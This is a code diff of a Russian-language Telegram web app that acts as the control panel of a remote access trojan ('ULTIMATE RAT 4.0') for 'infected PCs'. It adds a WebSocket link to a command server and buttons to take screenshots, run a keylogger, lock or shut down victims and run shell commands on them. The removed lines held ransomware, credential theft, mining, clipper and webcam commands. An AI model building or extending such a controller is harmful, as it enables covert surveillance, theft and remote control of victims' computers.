@@ -39,6 +39,36 @@
             -webkit-text-fill-color: transparent;
         }
         
+        .server-config {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .server-config h3 {
+            margin-bottom: 10px;
+        }
+        
+        .server-config input {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid #e94560;
+            color: white;
+            padding: 8px;
+            border-radius: 8px;
+            width: 180px;
+            margin: 5px;
+        }
+        
+        .server-config button {
+            background: #e94560;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+        }
+        
         .client-card {
             background: rgba(255,255,255,0.05);
             border-radius: 15px;
@@ -118,6 +148,17 @@
             max-height: 200px;
             overflow-y: auto;
         }
+        
+        .screenshot {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .screenshot img {
+            max-width: 100%;
+            border-radius: 10px;
+            border: 2px solid #e94560;
+        }
     </style>
 </head>
 <body>
@@ -127,33 +168,29 @@
             <p>Управление заражёнными ПК</p>
         </div>
         
+        <div class="server-config">
+            <h3>🌐 Настройки сервера</h3>
+            <input type="text" id="serverIp" placeholder="IP сервера" value="192.168.1.8">
+            <input type="text" id="serverPort" placeholder="Порт" value="5555">
+            <button onclick="connectToServer()">🔌 Подключиться</button>
+            <span id="connStatus" style="margin-left: 10px;">❌ Не подключен</span>
+        </div>
+        
         <div id="clients-list"></div>
         
         <div id="commands-panel" style="display: none;">
             <div class="menu-grid">
                 <button class="menu-btn" onclick="sendCommand('screen')">📸 Скриншот</button>
-                <button class="menu-btn" onclick="sendCommand('stream_start')">🎥 Стрим</button>
-                <button class="menu-btn" onclick="sendCommand('stream_stop')">🛑 Стоп</button>
                 <button class="menu-btn" onclick="sendCommand('keylog_start')">⌨️ Кейлоггер</button>
                 <button class="menu-btn" onclick="sendCommand('keylog_stop')">📝 Лог</button>
-                <button class="menu-btn" onclick="sendCommand('miner_start')">💰 Майнинг</button>
-                <button class="menu-btn" onclick="sendCommand('miner_stop')">⛏️ Стоп майнинг</button>
-                <button class="menu-btn" onclick="sendCommand('clipper_start')">🔄 Clipper</button>
-                <button class="menu-btn" onclick="sendCommand('clipper_stop')">✋ Стоп клиппер</button>
-                <button class="menu-btn" onclick="sendCommand('steal')">🔑 Кража</button>
-                <button class="menu-btn" onclick="sendCommand('ransom_start')">💀 Ransomware</button>
-                <button class="menu-btn" onclick="sendCommand('ransom_stop')">🔓 Расшифровка</button>
-                <button class="menu-btn" onclick="sendCommand('webcam')">📷 Веб-камера</button>
                 <button class="menu-btn" onclick="sendCommand('lock')">🔒 Блокировка</button>
                 <button class="menu-btn" onclick="sendCommand('shutdown')">💀 Выключение</button>
                 <button class="menu-btn" onclick="sendCommand('restart')">🔄 Перезагрузка</button>
-                <button class="menu-btn" onclick="sendCommand('bsod')">💀 BSOD</button>
-                <button class="menu-btn" onclick="sendCommand('rdp_on')">🖥️ RDP вкл</button>
-                <button class="menu-btn" onclick="sendCommand('rdp_off')">🖥️ RDP выкл</button>
                 <button class="menu-btn" onclick="openShell()">💻 Shell</button>
             </div>
             
             <div class="command-output" id="output"></div>
+            <div class="screenshot" id="screenshot"></div>
         </div>
         
         <div class="status-bar" id="status">
@@ -167,20 +204,87 @@
         tg.expand();
         
         let currentClient = null;
+        let ws = null;
+        let clients = {};
         
-        function updateClients() {
-            tg.sendData(JSON.stringify({action: 'get_clients'}));
+        function connectToServer() {
+            let ip = document.getElementById('serverIp').value;
+            let port = document.getElementById('serverPort').value;
+            
+            try {
+                ws = new WebSocket(`ws://${ip}:${port}`);
+                
+                ws.onopen = function() {
+                    document.getElementById('connStatus').innerHTML = '✅ Подключен';
+                    document.getElementById('connStatus').style.color = '#00ff00';
+                    addOutput('🟢 Подключен к серверу');
+                };
+                
+                ws.onmessage = function(event) {
+                    let data = JSON.parse(event.data);
+                    handleServerMessage(data);
+                };
+                
+                ws.onclose = function() {
+                    document.getElementById('connStatus').innerHTML = '❌ Отключен';
+                    document.getElementById('connStatus').style.color = '#ff0000';
+                    addOutput('🔴 Отключен от сервера');
+                };
+            } catch(e) {
+                addOutput('❌ Ошибка подключения: ' + e.message);
+            }
+        }
+        
+        function handleServerMessage(data) {
+            if (data.type === 'clients') {
+                updateClientsList(data.clients);
+            } else if (data.type === 'screenshot') {
+                displayScreenshot(data.image);
+            } else if (data.type === 'command_result') {
+                addOutput(`📟 ${data.result}`);
+            }
+        }
+        
+        function updateClientsList(clientsList) {
+            let container = document.getElementById('clients-list');
+            container.innerHTML = '';
+            
+            for (let id in clientsList) {
+                let client = clientsList[id];
+                let div = document.createElement('div');
+                div.className = 'client-card';
+                div.setAttribute('data-id', id);
+                div.onclick = () => selectClient(id);
+                div.innerHTML = `
+                    <div class="client-name">🖥️ ${id}</div>
+                    <div class="client-ip">${client.ip || 'IP неизвестен'}</div>
+                `;
+                container.appendChild(div);
+            }
+            
+            if (Object.keys(clientsList).length === 0) {
+                container.innerHTML = '<div style="text-align:center;padding:20px;">⚠️ Нет активных клиентов</div>';
+            }
         }
         
         function selectClient(clientId) {
             currentClient = clientId;
+            
             document.querySelectorAll('.client-card').forEach(card => {
                 card.classList.remove('selected');
             });
             document.querySelector(`[data-id="${clientId}"]`).classList.add('selected');
+            
             document.getElementById('commands-panel').style.display = 'block';
             document.getElementById('status').innerHTML = `✅ Управление: ${clientId}`;
-            tg.sendData(JSON.stringify({action: 'select', client: clientId}));
+            addOutput(`✅ Выбран клиент: ${clientId}`);
+            
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'select',
+                    client_id: clientId
+                }));
+            }
         }
         
         function sendCommand(cmd) {
@@ -188,32 +292,71 @@
                 alert('Сначала выбери клиента!');
                 return;
             }
-            tg.sendData(JSON.stringify({action: 'command', cmd: cmd, client: currentClient}));
+            
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                alert('Нет подключения к серверу!');
+                return;
+            }
+            
+            ws.send(JSON.stringify({
+                type: 'command',
+                client_id: currentClient,
+                command: cmd
+            }));
+            
             addOutput(`📤 Отправлено: ${cmd}`);
         }
         
         function openShell() {
             let shellCmd = prompt('Введи команду для выполнения:');
             if (shellCmd) {
-                tg.sendData(JSON.stringify({action: 'shell', cmd: shellCmd, client: currentClient}));
+                if (!ws || ws.readyState !== WebSocket.OPEN) {
+                    alert('Нет подключения к серверу!');
+                    return;
+                }
+                
+                ws.send(JSON.stringify({
+                    type: 'shell',
+                    client_id: currentClient,
+                    command: shellCmd
+                }));
+                
                 addOutput(`💻 Выполнено: ${shellCmd}`);
             }
         }
         
+        function displayScreenshot(imageData) {
+            let container = document.getElementById('screenshot');
+            container.innerHTML = `<img src="${imageData}">`;
+            addOutput('📸 Скриншот получен');
+        }
+        
         function addOutput(text) {
             let output = document.getElementById('output');
-            output.innerHTML += `[${new Date().toLocaleTimeString()}] ${text}\n`;
+            let time = new Date().toLocaleTimeString();
+            output.innerHTML += `[${time}] ${text}\n`;
             output.scrollTop = output.scrollHeight;
         }
         
-        tg.onEvent('mainButtonClicked', function() {
-            updateClients();
-        });
+        // Автоподключение при загрузке
+        setTimeout(() => {
+            connectToServer();
+        }, 500);
         
+        // Кнопка обновления списка
         tg.MainButton.setText("Обновить список");
+        tg.MainButton.onClick(() => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({type: 'get_clients'}));
+                addOutput('🔄 Обновление списка клиентов...');
+            } else {
+                addOutput('❌ Нет подключения к серверу');
+            }
+        });
         tg.MainButton.show();
         
-        updateClients();
+        addOutput('🔥 ULTIMATE RAT 4.0 готов к работе');
+        addOutput('📡 Введи IP сервера и нажми "Подключиться"');
     </script>
 </body>
 </html>
